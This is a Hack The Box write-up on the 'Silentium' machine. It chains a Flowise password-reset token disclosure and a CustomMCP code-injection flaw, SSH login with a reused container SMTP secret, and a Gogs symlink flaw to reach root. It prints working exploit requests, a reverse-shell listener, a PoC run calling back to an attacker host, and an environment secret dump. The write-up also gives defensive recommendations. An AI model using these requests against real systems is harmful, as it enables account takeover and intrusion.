---
title: "Silentium — Flowise Token Disclosure and CustomMCP Code Injection to Root"
description: "A password-reset token returned in an API response, unsafe dynamic configuration evaluation in an AI-agent platform, and container secret exposure chain through an internal service to privileged access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - flowise
  - ai-platform
objective: "Escalate from an unauthenticated password-reset token disclosure on a Flowise AI-agent platform to root through configuration-injection code execution, container secret reuse, and an internal service flaw."
tools:
  - rustscan
  - curl
  - netcat
  - ssh
  - netstat
skill: "Web application exploitation and Linux privilege escalation"
outcome: "Authenticated Flowise access, code execution inside the application container, a host SSH session via a reused container secret, and root through CVE-2025-8110 in the internal Gogs service"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux host running nginx with a main Flowise AI-agent platform (3.0.5) and a second Flowise instance on a staging virtual host; an internal Gogs service |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated password-reset token disclosure on a Flowise AI-agent platform to root through configuration-injection code execution, container secret reuse, and an internal service flaw |
| Outcome | Authenticated Flowise access, container code execution, host SSH access via a reused secret, and root through CVE-2025-8110 |

## From reset-token disclosure to Gogs symlink root

Silentium is an Easy-rated Hack The Box Linux lab built around a Flowise AI-agent platform. The main host runs Flowise 3.0.5, and a second Flowise instance is served on a separate staging virtual host. An unauthenticated forgot-password endpoint returns the password-reset `tempToken` directly in its JSON response (CVE-2025-58434), allowing account takeover for any known address; the authenticated session exposes an API key. The CustomMCP node then passes the user-supplied `mcpServerConfig` string to the JavaScript `Function()` constructor (CVE-2025-59528), giving code execution inside the application container, where SMTP credentials sit in environment variables and are reused to log in over SSH. The internal Gogs service is vulnerable to a symlink path-traversal issue in its file-update API (CVE-2025-8110) that yields root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/).

**Attack path:** **Forgot-password token disclosure (CVE-2025-58434) → account takeover and API key → CustomMCP `mcpServerConfig` JavaScript injection (CVE-2025-59528) → container code execution → SMTP credential reuse → SSH host access → internal Gogs symlink RCE (CVE-2025-8110) → root**

## nginx Flowise host with internal Gogs from unauthenticated access

- **Target:** a single Linux host serving a Flowise 3.0.5 AI-agent platform through nginx, plus a second Flowise instance on a staging virtual host and an internal Gogs service.
- **Exposed services:** SSH (22) and HTTP (80); Gogs listens on a loopback port.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from unauthenticated access to the application, reach code execution, cross into the host, and escalate to root.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: reset token to Gogs symlink RCE

### 1. Service Enumeration

Observation: a port scan exposes two services, and the web service identifies the application version.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```text
22/tcp: SSH
80/tcp: nginx — Flowise 3.0.5
```

Significance: SSH requires credentials that are not yet available, so the Flowise HTTP surface is the entry point; a published version pins the two application flaws used later.

Result: SSH and nginx/Flowise are identified; virtual-host enumeration, recorded in the source without captured output, revealed a second Flowise instance on `<STAGING_HOSTNAME>`.

### 2. Password-Reset Token Disclosure (CVE-2025-58434)

Observation: the `/api/v1/account/forgot-password` endpoint on the staging instance returns the reset token in its response body instead of only emailing it, so response differences also identify valid addresses. Flowise 3.0.5 and earlier are affected; the flaw is fixed in 3.0.6.

```bash
curl -s -X POST http://<STAGING_HOSTNAME>/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<LAB_EMAIL>"}}'
```

```text
[+] <LAB_EMAIL> : <RESET_TOKEN>
```

The returned token is submitted to the reset endpoint to set a new password for the account:

```bash
curl -s -X POST http://<STAGING_HOSTNAME>/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<LAB_EMAIL>","tempToken":"<RESET_TOKEN>","password":"<NEW_PASSWORD>"}}'
```

Significance: returning the reset token in the API response defeats the intended inbox-verification boundary, so knowledge of a single email address is enough to take over the account without any email access.

Result: the recovered token resets the account password, and the resulting session authenticates to the Flowise UI, where an API key is available.

### 3. CustomMCP JavaScript Injection (CVE-2025-59528)

Observation: the CustomMCP node parses the `mcpServerConfig` string by passing it to the JavaScript `Function()` constructor, equivalent to `eval()`, so supplied input runs as Node.js code with access to `child_process`. Flowise 3.0.5 is affected; the flaw is fixed in 3.0.6.

Action: confirm execution with a controlled timing delay.

```bash
time curl -s -X POST "http://<STAGING_HOSTNAME>/api/v1/node-load-method/customMCP" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_KEY>" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"<CONFIGURATION_EXPRESSION>"}}'
```

```text
real    0m5.109s
```

The same request is then repeated with `mcpServerConfig` set to a `child_process` call that opens a reverse shell to `<ATTACKER_IP>:<LISTENER_PORT>`; the payload is summarized as a placeholder and omitted.

```bash
nc -lvnp <LISTENER_PORT>
```

Significance: passing user-controlled configuration to `Function()` turns a configuration field into application-level code execution in the Node.js runtime.

Result: the timing delay confirms code execution, and a reverse shell is obtained inside the application container.

### 4. Container Secret Exposure and Host SSH Access

Observation: the container environment holds SMTP credentials.

```bash
env | grep -i smtp
```

```text
SMTP_PASSWORD=<SMTP_PASSWORD_VALUE>
```

The same value is then used to authenticate to the host over SSH.

```bash
ssh <LAB_USER>@<TARGET_HOSTNAME>
```

Significance: a secret scoped to the container stays valid against the host, so container-level code execution extends to a system login.

Result: a user-level host shell is obtained with the recovered container credential.

### 5. Internal Gogs and Privilege Escalation (CVE-2025-8110)

Observation: I checked the local listeners and found a self-hosted Gogs service bound to the loopback interface, not reachable directly.

```bash
netstat -tuln | grep 3001
```

```text
127.0.0.1:3001
```

Action: forward the port over the existing SSH session, then run a public proof-of-concept against the file-update API. Gogs 0.13.3 and earlier mishandle symlinks in the `PutContents` API, allowing a file write outside the repository.

```bash
ssh <LAB_USER>@<TARGET_HOSTNAME> -L 3001:127.0.0.1:3001
python3 <CVE_2025_8110_SCRIPT> -u http://127.0.0.1:3001/ -lh <ATTACKER_IP> -lp <LISTENER_PORT>
```

```text
root@<TARGET_HOSTNAME>:~#
```

Significance: a loopback-bound service remains part of the attack surface once host access exists, and a symlink-handling flaw in its write API turns repository access into code execution in the Gogs process context (running as root here).

Result: the returned shell runs as root on the host.

## The timing proof and the loopback Gogs service

| Challenge | Decision | Rationale |
|---|---|---|
| Confirming code execution through the CustomMCP node | Used a controlled five-second delay as the proof of execution | A measurable delay distinguishes executed code from an ignored or rejected input |
| Gogs listened only on the loopback interface | Forwarded the port over the authenticated SSH session | The service was unreachable directly, so the existing host shell provided access |

## Outcome: container execution, host SSH, and root

The source records root-level control of the host, reached by chaining an unauthenticated account takeover, configuration-driven code execution, a reused container secret, and an internal service flaw. The password reset, the virtual-host discovery, the container reverse shell, and the host SSH login are recorded in the source as documented results without captured console output, so I could not verify them beyond those notes; every stage with captured output is quoted above.

## Recommendations: token disclosure, dynamic evaluation, secret reuse, and Gogs

The source records the vulnerabilities and their impact, but not a test of the proposed mitigations.

1. **Password-reset token returned in an API response (CVE-2025-58434).** The forgot-password endpoint disclosed the `tempToken` in its JSON body, so only a known email address was needed to take over the account. *Recommendation:* never return reset tokens or account details in API responses, deliver tokens solely through the registered email channel, and make tokens single-use with short expiry. *Detection:* monitor password-reset requests and unexpected credential changes.
2. **Dynamic code evaluation of user-controlled configuration (CVE-2025-59528).** The CustomMCP node passed `mcpServerConfig` to `Function()`, executing it in the Node.js runtime with access to `child_process`. *Recommendation:* parse configuration with `JSON.parse()` rather than `Function()`/`eval()`, sandbox features that run OS commands, and upgrade to Flowise 3.0.6 or later. *Detection:* alert when `node-load-method/customMCP` requests carry executable configuration.
3. **Container secret reused for host authentication.** An SMTP password in the container environment also authenticated the host SSH account. *Recommendation:* issue unique credentials per workload, store secrets in a manager with role-based access, and never reuse a container secret for host login. *Detection:* monitor interactive SSH logins that use application service accounts.
4. **Internal Gogs exposed to a symlink code-execution flaw (CVE-2025-8110).** A loopback-bound Gogs service at an affected version mishandled symlinks in its file-update API. *Recommendation:* upgrade to a fixed Gogs release, restrict the service to trusted hosts, disable open registration, and enforce least privilege for the service account. *Detection:* monitor unusual `PutContents` API activity and repository creation with random names; this CVE is listed in CISA's Known Exploited Vulnerabilities catalog.

## References

- [Hack The Box — Silentium](https://app.hackthebox.com/machines/Silentium) (retired machine)
- [NVD — CVE-2025-58434](https://nvd.nist.gov/vuln/detail/CVE-2025-58434) (Flowise password-reset token disclosure, fixed in 3.0.6)
- [Flowise security advisory — GHSA-wgpv-6j63-x5ph](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph) (vendor advisory, fixed in 3.0.6)
- [NVD — CVE-2025-59528](https://nvd.nist.gov/vuln/detail/CVE-2025-59528) (Flowise CustomMCP remote code execution, fixed in 3.0.6)
- [Flowise security advisory — GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) (vendor advisory, fixed in 3.0.6)
- [NVD — CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110) (Gogs symlink path-traversal code execution)
- [CISA — Known Exploited Vulnerabilities: CVE-2025-8110](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-8110) (federal exploitation catalog entry)
- [Gogs security advisory — GHSA-gg64-xxr9-qhjp](https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp) (related Gogs advisory, tracked as CVE-2025-64111, patched in 0.13.4)
- [Gogs pull request 8082](https://github.com/gogs/gogs/pull/8082) (merged symlink-handling fix)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [curl manual page](https://curl.se/docs/manpage.html) (HTTP requests used throughout)
- [OpenSSH `ssh` manual](https://man.openbsd.org/ssh) (host login and local port forwarding)
- [OpenBSD `nc` manual](https://man.openbsd.org/nc) (reverse-shell listener)
- [`netstat` manual](https://man7.org/linux/man-pages/man8/netstat.8.html) (local listener inspection)
